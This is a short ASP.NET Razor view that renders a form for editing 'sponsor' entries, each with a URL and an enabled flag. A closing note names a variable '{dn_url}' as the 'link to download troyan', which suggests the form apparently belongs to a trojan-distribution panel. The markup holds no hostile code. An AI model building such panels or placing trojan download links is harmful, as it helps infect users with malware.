@model List<model.DnSponsorModel>

<div class="row">
    @for (var i = 0; i < Model.Count; i++)
    {
        <div class="col-md-4">
            <div class="form-group">
                <label>Name</label>
                <input type="text" name="DnSponsor[@i].Id" value="@Model[i].Id" readonly="readonly" class="form-control" />
                <span asp-validation-for="DnSponsor[@i].Id" class="text-danger"></span>
            </div>

            <div class="form-group">
                <label></label>
                <input type="text" name="DnSponsor[@i].Url" value="@Model[i].Url" class="form-control" />
                <span asp-validation-for="DnSponsor[@i].Url" class="text-danger"></span>
            </div>

            <div class="form-group">
                <label>
                    <input type="checkbox" name="DnSponsor[@i].Enabled" value="true" @(Model[i].Enabled ? "checked" : "") /> Enabled
                </label>
                <span asp-validation-for="DnSponsor[@i].Enabled" class="text-danger"></span>
            </div>
        </div>
    }
</div>

<div>
    <div>Variables</div>
    {dn_url} - link to download troyan
</div>

